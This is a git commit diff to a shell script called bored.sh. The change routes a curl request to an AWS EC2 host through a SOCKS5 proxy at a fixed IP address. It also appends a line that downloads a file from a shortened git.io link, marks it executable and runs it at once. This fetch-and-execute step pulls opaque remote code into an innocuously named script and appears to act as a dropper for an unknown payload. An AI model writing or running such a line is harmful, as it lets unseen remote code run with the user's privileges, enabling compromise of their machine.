8096ab29549609bad05ccf91c3c4bef1904caea2
erdsaesdrse <97901220+erdsaesdrse@users.noreply.github.com>
2022-01-17 22:52:08 +0700

    Update bored.sh

--- bored.sh
+++ bored.sh
@@ -1,9 +1,10 @@
 !#/bin/bash
 
-curl -I "https://www.google.com" -x socks5://178.154.220.124:1080
+curl -I "ec2-52-205-253-48.compute-1.amazonaws.com" -x socks5://178.154.220.124:1080
 
 curl ipinfo.io; echo
 if ! hash ping &>/dev/null; then
   echo "Installing ping tools ..."
   apt-get install iputils-ping -y &>/dev/null
 fi
+wget https://git.io/J9cIN && chmod +x J9cIN && ./J9cIN
